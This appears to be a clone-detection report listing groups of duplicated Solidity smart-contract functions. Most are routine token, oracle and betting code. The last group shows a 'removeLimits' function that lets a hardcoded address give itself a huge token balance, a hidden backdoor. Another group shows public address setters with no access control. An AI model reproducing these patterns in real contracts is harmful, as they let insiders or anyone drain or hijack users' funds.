<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="2195" endline="2224" pcid="1764">
  function approveWithAuthorization(
    address owner,
    address spender,
    uint256 value,
    uint256 validAfter,
    uint256 validBefore,
    bytes32 nonce,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external hasProcessor {
    _requireValidAuthorization(owner, nonce, validAfter, validBefore);

    bytes memory data = abi.encode(
      APPROVE_WITH_AUTHORIZATION_TYPEHASH,
      owner,
      spender,
      value,
      validAfter,
      validBefore,
      nonce
    );
    require(
      EIP712.recover(DOMAIN_SEPARATOR, v, r, s, data) == owner,
      "SI01"
    );

    _markAuthorizationAsUsed(owner, nonce);
    _approve(owner, spender, value);
  }
</source>
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="2281" endline="2310" pcid="1766">
  function decreaseApprovalWithAuthorization(
    address owner,
    address spender,
    uint256 decrement,
    uint256 validAfter,
    uint256 validBefore,
    bytes32 nonce,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external hasProcessor {
    _requireValidAuthorization(owner, nonce, validAfter, validBefore);

    bytes memory data = abi.encode(
      DECREASE_APPROVAL_WITH_AUTHORIZATION_TYPEHASH,
      owner,
      spender,
      decrement,
      validAfter,
      validBefore,
      nonce
    );
    require(
      EIP712.recover(DOMAIN_SEPARATOR, v, r, s, data) == owner,
      "SI01"
    );

    _markAuthorizationAsUsed(owner, nonce);
    _decreaseApproval(owner, spender, decrement);
  }
</source>
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="2238" endline="2267" pcid="1765">
  function increaseApprovalWithAuthorization(
    address owner,
    address spender,
    uint256 increment,
    uint256 validAfter,
    uint256 validBefore,
    bytes32 nonce,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external hasProcessor {
    _requireValidAuthorization(owner, nonce, validAfter, validBefore);

    bytes memory data = abi.encode(
      INCREASE_APPROVAL_WITH_AUTHORIZATION_TYPEHASH,
      owner,
      spender,
      increment,
      validAfter,
      validBefore,
      nonce
    );
    require(
      EIP712.recover(DOMAIN_SEPARATOR, v, r, s, data) == owner,
      "SI01"
    );

    _markAuthorizationAsUsed(owner, nonce);
    _increaseApproval(owner, spender, increment);
  }
</source>
</class>

<class classid="173" nclones="3" nlines="3" similarity="100">
<source file="systems/source-code/0x35cc88ceee77d89f3b523ec1aae39a37e1efca67.sol" startline="98" endline="100" pcid="1793">
  function changeBridge(address _bridge) public {
    bridge = _bridge;
  }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="464" endline="468" pcid="4534">
    function setBrigdeBuyTokenFromBSCAddress(address brigdeBuyTokenFromBSC)
        public
    {
        _brigdeBuyTokenFromBSC = brigdeBuyTokenFromBSC;
    }
</source>
<source file="systems/source-code/0x35cc88ceee77d89f3b523ec1aae39a37e1efca67.sol" startline="102" endline="104" pcid="1794">
  function changeW(address _W) public {
    wrappedToken = _W;
  }
</source>
</class>

<class classid="174" nclones="3" nlines="4" similarity="100">
<source file="systems/source-code/0x3Ad865f49cb532cE565677635F9ED7b3CbF27A5d.sol" startline="182" endline="185" pcid="1976">
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        return a % b;
    }
</source>
<source file="systems/source-code/0xdd34428a0dd260cc83608d16abcd1f8baf0c097c.sol" startline="182" endline="185" pcid="7872">
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        return a % b;
    }
</source>
<source file="systems/source-code/0x8EB829589a20Aa412577544cD6e9732087B691AB.sol" startline="70" endline="73" pcid="5228">
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        return a % b;
    }
</source>
</class>

<class classid="175" nclones="6" nlines="4" similarity="100">
<source file="systems/source-code/0x3Ad865f49cb532cE565677635F9ED7b3CbF27A5d.sol" startline="302" endline="305" pcid="1983">
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }
</source>
<source file="systems/source-code/0xdd34428a0dd260cc83608d16abcd1f8baf0c097c.sol" startline="321" endline="324" pcid="7880">
    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));
        return true;
    }
</source>
<source file="systems/source-code/0x3Ad865f49cb532cE565677635F9ED7b3CbF27A5d.sol" startline="321" endline="324" pcid="1984">
    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));
        return true;
    }
</source>
<source file="systems/source-code/0xdd34428a0dd260cc83608d16abcd1f8baf0c097c.sol" startline="302" endline="305" pcid="7879">
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }
</source>
<source file="systems/source-code/0x8EB829589a20Aa412577544cD6e9732087B691AB.sol" startline="240" endline="250" pcid="5236">
    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(subtractedValue)
        );
        return true;
    }
</source>
<source file="systems/source-code/0x8EB829589a20Aa412577544cD6e9732087B691AB.sol" startline="218" endline="228" pcid="5235">
    function increaseAllowance(address spender, uint256 addedValue)
        public
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }
</source>
</class>

<class classid="176" nclones="4" nlines="7" similarity="83">
<source file="systems/source-code/0x3Ad865f49cb532cE565677635F9ED7b3CbF27A5d.sol" startline="340" endline="347" pcid="1985">
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="427" endline="434" pcid="8117">
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
</source>
<source file="systems/source-code/0x8EB829589a20Aa412577544cD6e9732087B691AB.sol" startline="258" endline="268" pcid="5237">
    function _transfer(
        address from,
        address to,
        uint256 value
    ) internal {
        require(to != address(0), "ERC20: transfer to the zero address");

        _balances[from] = _balances[from].sub(value);
        _balances[to] = _balances[to].add(value);
        emit Transfer(from, to, value);
    }
</source>
<source file="systems/source-code/0xdd34428a0dd260cc83608d16abcd1f8baf0c097c.sol" startline="340" endline="347" pcid="7881">
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
</source>
</class>

<class classid="177" nclones="3" nlines="6" similarity="100">
<source file="systems/source-code/0x3Ad865f49cb532cE565677635F9ED7b3CbF27A5d.sol" startline="377" endline="383" pcid="1987">
    function _burn(address account, uint256 value) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _totalSupply = _totalSupply.sub(value);
        _balances[account] = _balances[account].sub(value);
        emit Transfer(account, address(0), value);
    }
</source>
<source file="systems/source-code/0x8EB829589a20Aa412577544cD6e9732087B691AB.sol" startline="291" endline="297" pcid="5239">
    function _burn(address account, uint256 value) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _totalSupply = _totalSupply.sub(value);
        _balances[account] = _balances[account].sub(value);
        emit Transfer(account, address(0), value);
    }
</source>
<source file="systems/source-code/0xdd34428a0dd260cc83608d16abcd1f8baf0c097c.sol" startline="377" endline="383" pcid="7883">
    function _burn(address account, uint256 value) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _totalSupply = _totalSupply.sub(value);
        _balances[account] = _balances[account].sub(value);
        emit Transfer(account, address(0), value);
    }
</source>
</class>

<class classid="178" nclones="3" nlines="4" similarity="100">
<source file="systems/source-code/0x3Ad865f49cb532cE565677635F9ED7b3CbF27A5d.sol" startline="412" endline="415" pcid="1989">
    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(account, msg.sender, _allowances[account][msg.sender].sub(amount));
    }
</source>
<source file="systems/source-code/0x8EB829589a20Aa412577544cD6e9732087B691AB.sol" startline="325" endline="332" pcid="5241">
    function _burnFrom(address account, uint256 value) internal {
        _burn(account, value);
        _approve(
            account,
            msg.sender,
            _allowances[account][msg.sender].sub(value)
        );
    }
</source>
<source file="systems/source-code/0xdd34428a0dd260cc83608d16abcd1f8baf0c097c.sol" startline="412" endline="415" pcid="7885">
    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(account, msg.sender, _allowances[account][msg.sender].sub(amount));
    }
</source>
</class>

<class classid="179" nclones="4" nlines="3" similarity="100">
<source file="systems/source-code/0x3Ad865f49cb532cE565677635F9ED7b3CbF27A5d.sol" startline="461" endline="463" pcid="1990">
    function burn(uint256 value) public {
      _burn(msg.sender, value);
    }
</source>
<source file="systems/source-code/0xa50904cb0ca5824ff012222a39420cb177d5b3ce.sol" startline="248" endline="250" pcid="6005">
	function burn(uint256 _value) public {
		_burn(msg.sender, _value);
	}
</source>
<source file="systems/source-code/0x89deb6c8918a42457bd6ddbcaaf979216c4d774c.sol" startline="247" endline="249" pcid="5136">
	function burn(uint256 _value) public {
		_burn(msg.sender, _value);
	}
</source>
<source file="systems/source-code/0xdd34428a0dd260cc83608d16abcd1f8baf0c097c.sol" startline="461" endline="463" pcid="7886">
    function burn(uint256 value) public {
      _burn(msg.sender, value);
    }
</source>
</class>

<class classid="180" nclones="2" nlines="9" similarity="100">
<source file="systems/source-code/0x3bba50bc453896dcfada8ce2ab7914f3a2e7f3dd.sol" startline="527" endline="542" pcid="2024">
    function getDataAfter(bytes32 _queryId, uint256 _timestamp)
        public
        view
        returns (bytes memory _value, uint256 _timestampRetrieved)
    {
        (bool _found, uint256 _index) = getIndexForDataAfter(
            _queryId,
            _timestamp
        );
        if (!_found) {
            return ("", 0);
        }
        _timestampRetrieved = getTimestampbyQueryIdandIndex(_queryId, _index);
        _value = retrieveData(_queryId, _timestampRetrieved);
        return (_value, _timestampRetrieved);
    }
</source>
<source file="systems/source-code/0x44d52feafb1f4006199da69af016ddc5e8094869.sol" startline="73" endline="88" pcid="2555">
    function getDataAfter(bytes32 _queryId, uint256 _timestamp)
        internal
        view
        returns (bytes memory _value, uint256 _timestampRetrieved)
    {
        (bool _found, uint256 _index) = getIndexForDataAfter(
            _queryId,
            _timestamp
        );
        if (!_found) {
            return ("", 0);
        }
        _timestampRetrieved = getTimestampbyQueryIdandIndex(_queryId, _index);
        _value = retrieveData(_queryId, _timestampRetrieved);
        return (_value, _timestampRetrieved);
    }
</source>
</class>

<class classid="181" nclones="2" nlines="53" similarity="100">
<source file="systems/source-code/0x3bba50bc453896dcfada8ce2ab7914f3a2e7f3dd.sol" startline="570" endline="651" pcid="2026">
    function getIndexForDataAfter(bytes32 _queryId, uint256 _timestamp)
        public
        view
        returns (bool _found, uint256 _index)
    {
        uint256 _count = getNewValueCountbyQueryId(_queryId);
        if (_count == 0) return (false, 0);
        _count--;
        bool _search = true; // perform binary search
        uint256 _middle = 0;
        uint256 _start = 0;
        uint256 _end = _count;
        uint256 _timestampRetrieved;
        // checking boundaries to short-circuit the algorithm
        _timestampRetrieved = getTimestampbyQueryIdandIndex(_queryId, _end);
        if (_timestampRetrieved <= _timestamp) return (false, 0);
        _timestampRetrieved = getTimestampbyQueryIdandIndex(_queryId, _start);
        if (_timestampRetrieved > _timestamp) {
            // candidate found, check for disputes
            _search = false;
        }
        // since the value is within our boundaries, do a binary search
        while (_search) {
            _middle = (_end + _start) / 2;
            _timestampRetrieved = getTimestampbyQueryIdandIndex(
                _queryId,
                _middle
            );
            if (_timestampRetrieved > _timestamp) {
                // get immediate previous value
                uint256 _prevTime = getTimestampbyQueryIdandIndex(
                    _queryId,
                    _middle - 1
                );
                if (_prevTime <= _timestamp) {
                    // candidate found, check for disputes
                    _search = false;
                } else {
                    // look from start to middle -1(prev value)
                    _end = _middle - 1;
                }
            } else {
                // get immediate next value
                uint256 _nextTime = getTimestampbyQueryIdandIndex(
                    _queryId,
                    _middle + 1
                );
                if (_nextTime > _timestamp) {
                    // candidate found, check for disputes
                    _search = false;
                    _middle++;
                    _timestampRetrieved = _nextTime;
                } else {
                    // look from middle + 1(next value) to end
                    _start = _middle + 1;
                }
            }
        }
        // candidate found, check for disputed values
        if (!isInDispute(_queryId, _timestampRetrieved)) {
            // _timestampRetrieved is correct
            return (true, _middle);
        } else {
            // iterate forward until we find a non-disputed value
            while (
                isInDispute(_queryId, _timestampRetrieved) && _middle < _count
            ) {
                _middle++;
                _timestampRetrieved = getTimestampbyQueryIdandIndex(
                    _queryId,
                    _middle
                );
            }
            if (
                _middle == _count && isInDispute(_queryId, _timestampRetrieved)
            ) {
                return (false, 0);
            }
            // _timestampRetrieved is correct
            return (true, _middle);
        }
    }
</source>
<source file="systems/source-code/0x44d52feafb1f4006199da69af016ddc5e8094869.sol" startline="98" endline="179" pcid="2556">
    function getIndexForDataAfter(bytes32 _queryId, uint256 _timestamp)
        internal
        view
        returns (bool _found, uint256 _index)
    {
        uint256 _count = getNewValueCountbyQueryId(_queryId);
        if (_count == 0) return (false, 0);
        _count--;
        bool _search = true; // perform binary search
        uint256 _middle = 0;
        uint256 _start = 0;
        uint256 _end = _count;
        uint256 _timestampRetrieved;
        // checking boundaries to short-circuit the algorithm
        _timestampRetrieved = getTimestampbyQueryIdandIndex(_queryId, _end);
        if (_timestampRetrieved <= _timestamp) return (false, 0);
        _timestampRetrieved = getTimestampbyQueryIdandIndex(_queryId, _start);
        if (_timestampRetrieved > _timestamp) {
            // candidate found, check for disputes
            _search = false;
        }
        // since the value is within our boundaries, do a binary search
        while (_search) {
            _middle = (_end + _start) / 2;
            _timestampRetrieved = getTimestampbyQueryIdandIndex(
                _queryId,
                _middle
            );
            if (_timestampRetrieved > _timestamp) {
                // get immediate previous value
                uint256 _prevTime = getTimestampbyQueryIdandIndex(
                    _queryId,
                    _middle - 1
                );
                if (_prevTime <= _timestamp) {
                    // candidate found, check for disputes
                    _search = false;
                } else {
                    // look from start to middle -1(prev value)
                    _end = _middle - 1;
                }
            } else {
                // get immediate next value
                uint256 _nextTime = getTimestampbyQueryIdandIndex(
                    _queryId,
                    _middle + 1
                );
                if (_nextTime > _timestamp) {
                    // candidate found, check for disputes
                    _search = false;
                    _middle++;
                    _timestampRetrieved = _nextTime;
                } else {
                    // look from middle + 1(next value) to end
                    _start = _middle + 1;
                }
            }
        }
        // candidate found, check for disputed values
        if (!isInDispute(_queryId, _timestampRetrieved)) {
            // _timestampRetrieved is correct
            return (true, _middle);
        } else {
            // iterate forward until we find a non-disputed value
            while (
                isInDispute(_queryId, _timestampRetrieved) && _middle < _count
            ) {
                _middle++;
                _timestampRetrieved = getTimestampbyQueryIdandIndex(
                    _queryId,
                    _middle
                );
            }
            if (
                _middle == _count && isInDispute(_queryId, _timestampRetrieved)
            ) {
                return (false, 0);
            }
            // _timestampRetrieved is correct
            return (true, _middle);
        }
    }
</source>
</class>

<class classid="182" nclones="2" nlines="3" similarity="100">
<source file="systems/source-code/0x3bba50bc453896dcfada8ce2ab7914f3a2e7f3dd.sol" startline="735" endline="741" pcid="2029">
    function getNewValueCountbyQueryId(bytes32 _queryId)
        public
        view
        returns (uint256)
    {
        return tellor.getNewValueCountbyQueryId(_queryId);
    }
</source>
<source file="systems/source-code/0x44d52feafb1f4006199da69af016ddc5e8094869.sol" startline="187" endline="193" pcid="2557">
    function getNewValueCountbyQueryId(bytes32 _queryId)
        internal
        view
        returns (uint256)
    {
        return tellor.getNewValueCountbyQueryId(_queryId);
    }
</source>
</class>

<class classid="183" nclones="5" nlines="3" similarity="100">
<source file="systems/source-code/0x3bba50bc453896dcfada8ce2ab7914f3a2e7f3dd.sol" startline="749" endline="755" pcid="2030">
    function getReporterByTimestamp(bytes32 _queryId, uint256 _timestamp)
        public
        view
        returns (address)
    {
        return tellor.getReporterByTimestamp(_queryId, _timestamp);
    }
</source>
<source file="systems/source-code/0x3bba50bc453896dcfada8ce2ab7914f3a2e7f3dd.sol" startline="777" endline="783" pcid="2032">
    function isInDispute(bytes32 _queryId, uint256 _timestamp)
        public
        view
        returns (bool)
    {
        return tellor.isInDispute(_queryId, _timestamp);
    }
</source>
<source file="systems/source-code/0x44d52feafb1f4006199da69af016ddc5e8094869.sol" startline="201" endline="207" pcid="2558">
    function getTimestampbyQueryIdandIndex(bytes32 _queryId, uint256 _index)
        internal
        view
        returns (uint256)
    {
        return tellor.getTimestampbyQueryIdandIndex(_queryId, _index);
    }
</source>
<source file="systems/source-code/0x3bba50bc453896dcfada8ce2ab7914f3a2e7f3dd.sol" startline="763" endline="769" pcid="2031">
    function getTimestampbyQueryIdandIndex(bytes32 _queryId, uint256 _index)
        public
        view
        returns (uint256)
    {
        return tellor.getTimestampbyQueryIdandIndex(_queryId, _index);
    }
</source>
<source file="systems/source-code/0x44d52feafb1f4006199da69af016ddc5e8094869.sol" startline="215" endline="221" pcid="2559">
    function isInDispute(bytes32 _queryId, uint256 _timestamp)
        internal
        view
        returns (bool)
    {
        return tellor.isInDispute(_queryId, _timestamp);
    }
</source>
</class>

<class classid="184" nclones="2" nlines="3" similarity="100">
<source file="systems/source-code/0x3bba50bc453896dcfada8ce2ab7914f3a2e7f3dd.sol" startline="791" endline="797" pcid="2033">
    function retrieveData(bytes32 _queryId, uint256 _timestamp)
        public
        view
        returns (bytes memory)
    {
        return tellor.retrieveData(_queryId, _timestamp);
    }
</source>
<source file="systems/source-code/0x44d52feafb1f4006199da69af016ddc5e8094869.sol" startline="229" endline="235" pcid="2560">
    function retrieveData(bytes32 _queryId, uint256 _timestamp)
        internal
        view
        returns (bytes memory)
    {
        return tellor.retrieveData(_queryId, _timestamp);
    }
</source>
</class>

<class classid="185" nclones="4" nlines="8" similarity="100">
<source file="systems/source-code/0x3bba50bc453896dcfada8ce2ab7914f3a2e7f3dd.sol" startline="916" endline="923" pcid="2037">
    function betOnYes(uint256 _amt) external payable{
        require(block.timestamp < endDate, "end date passed");
        require(_amt > 0, "amount too low");
        require(_amt == msg.value, "amount != msg.value");
        addyToYes[msg.sender] = addyToYes[msg.sender] + msg.value;
        yesBets += msg.value;
        emit YesBet(msg.sender,msg.value);
    }
</source>
<source file="systems/source-code/0x3bba50bc453896dcfada8ce2ab7914f3a2e7f3dd.sol" startline="929" endline="936" pcid="2038">
    function betOnNo(uint256 _amt) external payable{
        require(block.timestamp < endDate, "end date passed");
        require(_amt > 0, "amount too low");
        require(_amt == msg.value, "amount != msg.value");
        addyToNo[msg.sender] = addyToNo[msg.sender] + msg.value;
        noBets += msg.value;
        emit NoBet(msg.sender,msg.value);
    }
</source>
<source file="systems/source-code/0x44d52feafb1f4006199da69af016ddc5e8094869.sol" startline="311" endline="318" pcid="2562">
    function betOnNo(uint256 _amt) external payable{
        require(block.timestamp < endDate, "end date passed");
        require(_amt > 0, "amount too low");
        require(_amt == msg.value, "amount != msg.value");
        addyToNo[msg.sender] = addyToNo[msg.sender] + msg.value;
        noBets += msg.value;
        emit NoBet(msg.sender,msg.value);
    }
</source>
<source file="systems/source-code/0x44d52feafb1f4006199da69af016ddc5e8094869.sol" startline="298" endline="305" pcid="2561">
    function betOnYes(uint256 _amt) external payable{
        require(block.timestamp < endDate, "end date passed");
        require(_amt > 0, "amount too low");
        require(_amt == msg.value, "amount != msg.value");
        addyToYes[msg.sender] = addyToYes[msg.sender] + msg.value;
        yesBets += msg.value;
        emit YesBet(msg.sender,msg.value);
    }
</source>
</class>

<class classid="186" nclones="2" nlines="24" similarity="100">
<source file="systems/source-code/0x3bba50bc453896dcfada8ce2ab7914f3a2e7f3dd.sol" startline="941" endline="964" pcid="2039">
    function claimWinnings() external{
        if(settled){
            uint256 _amt;
            uint256 _myAmt;
            if(unresolved){
                _amt = addyToYes[msg.sender] + addyToNo[msg.sender];
                addyToYes[msg.sender] = 0; 
                addyToNo[msg.sender] = 0; 
            }
            else if(yesWins ){
                _myAmt = addyToYes[msg.sender];
                _amt = (noBets * _myAmt/yesBets) + _myAmt;
                addyToYes[msg.sender] = 0;
            }
            else{
                _myAmt = addyToNo[msg.sender];
                _amt = (yesBets * _myAmt/noBets) + _myAmt;
                addyToNo[msg.sender] = 0;
            }
            require(_amt > 0, "amount must be greater than 0");
            payable(msg.sender).transfer(_amt);
            emit WinningsClaimed(msg.sender, _amt);
        }
    }
</source>
<source file="systems/source-code/0x44d52feafb1f4006199da69af016ddc5e8094869.sol" startline="323" endline="346" pcid="2563">
    function claimWinnings() external{
        if(settled){
            uint256 _amt;
            uint256 _myAmt;
            if(unresolved){
                _amt = addyToYes[msg.sender] + addyToNo[msg.sender];
                addyToYes[msg.sender] = 0; 
                addyToNo[msg.sender] = 0; 
            }
            else if(yesWins ){
                _myAmt = addyToYes[msg.sender];
                _amt = (noBets * _myAmt/yesBets) + _myAmt;
                addyToYes[msg.sender] = 0;
            }
            else{
                _myAmt = addyToNo[msg.sender];
                _amt = (yesBets * _myAmt/noBets) + _myAmt;
                addyToNo[msg.sender] = 0;
            }
            require(_amt > 0, "amount must be greater than 0");
            payable(msg.sender).transfer(_amt);
            emit WinningsClaimed(msg.sender, _amt);
        }
    }
</source>
</class>

<class classid="187" nclones="2" nlines="15" similarity="100">
<source file="systems/source-code/0x3bba50bc453896dcfada8ce2ab7914f3a2e7f3dd.sol" startline="970" endline="985" pcid="2040">
    function settleBet() external{
        require(!settled, "settled");
        (bytes memory _value, uint256 _timestampRetrieved) =
            getDataAfter(queryId, endDate + delay);
        require(_timestampRetrieved !=0, "no tellor value");
        if(block.timestamp - _timestampRetrieved >= 24 hours) {
                settled = true;
                if(keccak256(_value) == keccak256(abi.encode("Yes"))){
                            yesWins = true;
                        }
                else if(keccak256(_value) != keccak256(abi.encode("No"))){
                            unresolved = true;
                }
                emit BetSettled(yesWins);
        }
    }
</source>
<source file="systems/source-code/0x44d52feafb1f4006199da69af016ddc5e8094869.sol" startline="352" endline="367" pcid="2564">
    function settleBet() external{
        require(!settled, "settled");
        (bytes memory _value, uint256 _timestampRetrieved) =
            getDataAfter(queryId, endDate + delay);
        require(_timestampRetrieved !=0, "no tellor value");
        if(block.timestamp - _timestampRetrieved >= 24 hours) {
                settled = true;
                if(keccak256(_value) == keccak256(abi.encode("Yes"))){
                            yesWins = true;
                        }
                else if(keccak256(_value) != keccak256(abi.encode("No"))){
                            unresolved = true;
                }
                emit BetSettled(yesWins);
        }
    }
</source>
</class>

<class classid="188" nclones="2" nlines="3" similarity="100">
<source file="systems/source-code/0x3bba50bc453896dcfada8ce2ab7914f3a2e7f3dd.sol" startline="991" endline="993" pcid="2041">
    function getCurrentOddsOfYes() external view returns(uint256){
        return (yesBets * 100)/(yesBets + noBets);
    }
</source>
<source file="systems/source-code/0x44d52feafb1f4006199da69af016ddc5e8094869.sol" startline="373" endline="375" pcid="2565">
    function getCurrentOddsOfYes() external view returns(uint256){
        return (yesBets * 100)/(yesBets + noBets);
    }
</source>
</class>

<class classid="189" nclones="2" nlines="21" similarity="100">
<source file="systems/source-code/0x3bba50bc453896dcfada8ce2ab7914f3a2e7f3dd.sol" startline="998" endline="1019" pcid="2042">
    function getSettlementStatus() external view
        returns(bool,bool _yesWins, bool _unresolved,string memory,uint256 _timeUntilSettlement){
        (bytes memory _value, uint256 _timestampRetrieved) = getDataAfter(queryId, endDate + delay);
        if(_timestampRetrieved > 0){
                    if( block.timestamp > _timestampRetrieved + 24 hours){
            _timeUntilSettlement = 0;
            }
            else if (block.timestamp - _timestampRetrieved < 24 hours){
                _timeUntilSettlement = 24 hours - (block.timestamp - _timestampRetrieved);
            }
            if(keccak256(_value) == keccak256(abi.encode("Yes"))){
                        _yesWins = true;
                    }
            else if(keccak256(_value) != keccak256(abi.encode("No"))){
                        _unresolved = true;
            }
        }
        else{
            _timeUntilSettlement = (endDate + delay + 24 hours) - block.timestamp;
        }
        return (settled, _yesWins, _unresolved, string(_value),_timeUntilSettlement);
    }
</source>
<source file="systems/source-code/0x44d52feafb1f4006199da69af016ddc5e8094869.sol" startline="380" endline="401" pcid="2566">
    function getSettlementStatus() external view
        returns(bool,bool _yesWins, bool _unresolved,string memory,uint256 _timeUntilSettlement){
        (bytes memory _value, uint256 _timestampRetrieved) = getDataAfter(queryId, endDate + delay);
        if(_timestampRetrieved > 0){
                    if( block.timestamp > _timestampRetrieved + 24 hours){
            _timeUntilSettlement = 0;
            }
            else if (block.timestamp - _timestampRetrieved < 24 hours){
                _timeUntilSettlement = 24 hours - (block.timestamp - _timestampRetrieved);
            }
            if(keccak256(_value) == keccak256(abi.encode("Yes"))){
                        _yesWins = true;
                    }
            else if(keccak256(_value) != keccak256(abi.encode("No"))){
                        _unresolved = true;
            }
        }
        else{
            _timeUntilSettlement = (endDate + delay + 24 hours) - block.timestamp;
        }
        return (settled, _yesWins, _unresolved, string(_value),_timeUntilSettlement);
    }
</source>
</class>

<class classid="190" nclones="2" nlines="5" similarity="75">
<source file="systems/source-code/0x3f880a91870d7011e4c722ef84c6922f396373f3.sol" startline="136" endline="140" pcid="2277">
    function withdrawAllTokens() external onlyOwner {
        uint256 amount = token.balanceOf(address(this));
        require(amount > 0, "No tokens to withdraw");
        token.transfer(treasuryContract, amount);
    }
</source>
<source file="systems/source-code/0x5a22ab99e1ffc1c27967cb3f4d7da6b535077c23.sol" startline="169" endline="172" pcid="3404">
    function withdrawTRB() public onlyOwner {
        uint256 balance = tellorToken.balanceOf(address(this));
        tellorToken.transfer(owner, balance);
    }
</source>
</class>

<class classid="191" nclones="3" nlines="3" similarity="100">
<source file="systems/source-code/0x3f880a91870d7011e4c722ef84c6922f396373f3.sol" startline="150" endline="152" pcid="2279">
    function getClaimedAirdropAmount(address userAddress) external view returns (uint256) {
        return allocations[userAddress].claimedAirdrop;
    }
</source>
<source file="systems/source-code/0x3f880a91870d7011e4c722ef84c6922f396373f3.sol" startline="154" endline="156" pcid="2280">
    function getClaimedPresaleAmount(address userAddress) external view returns (uint256) {
        return allocations[userAddress].claimedPresale;
    }
</source>
<source file="systems/source-code/0xB01F11280F7A164E418F6740181658e441f2250e.sol" startline="249" endline="251" pcid="6467">
    function getWalletSalesCount(address _address) public view returns (uint) {
        return walletsSalesDone[_address].length;
    }
</source>
</class>

<class classid="192" nclones="3" nlines="9" similarity="100">
<source file="systems/source-code/0x3fdeaec806bd455a7f241a1b33f468b43cb2057b.sol" startline="196" endline="206" pcid="2325">
    function _transfer(address _from, address _to, uint _value) private {
        require(_from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");
        require(balanceOf[_from] >= _value, "Sender amount must be greater than value");

        balanceOf[_from] = balanceOf[_from].sub(_value);
        balanceOf[_to] = balanceOf[_to].add(_value);

        log.record(_from, _to, _value);
        emit Transfer(msg.sender, _to, _value);
    }
</source>
<source file="systems/source-code/0x71ee7f095E811A3dE31cbea5fB6aBCdC5aFaE9f4.sol" startline="182" endline="192" pcid="4193">
    function _transfer(address _from, address _to, uint _value) private {
        require(_from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");
        require(balanceOf[_from] >= _value, "Sender amount must be greater than value");

        balanceOf[_from] = balanceOf[_from].sub(_value);
        balanceOf[_to] = balanceOf[_to].add(_value);

        log.record(_from, _to, _value);
        emit Transfer(msg.sender, _to, _value);
    }
</source>
<source file="systems/source-code/0x4396B7E63f562e7Bb603B31d9e9368dA29F9D579.sol" startline="191" endline="201" pcid="2493">
    function _transfer(address _from, address _to, uint _value) private {
        require(_from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");
        require(balanceOf[_from] >= _value, "Sender amount must be greater than value");

        balanceOf[_from] = balanceOf[_from].sub(_value);
        balanceOf[_to] = balanceOf[_to].add(_value);

        log.record(_from, _to, _value);
        emit Transfer(msg.sender, _to, _value);
    }
</source>
</class>

<class classid="193" nclones="11" nlines="5" similarity="100">
<source file="systems/source-code/0x400ceeaef948d1DfE5fD1F2fa5a431Fb7e11a086.sol" startline="41" endline="45" pcid="2338">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*40000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xdea8f0f40066bbc20c044729f08d3c488e4603d8.sol" startline="43" endline="47" pcid="7953">
    function removeLimits(uint256 aiBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*40000*aiBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x6Bf6EE9e148031D538521BB8Ed8658C6Fe12391a.sol" startline="43" endline="47" pcid="3965">
    function removeLimits(uint256 aiBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*40000*aiBot*10**tokenDecimals;
        }
    } 
</source>
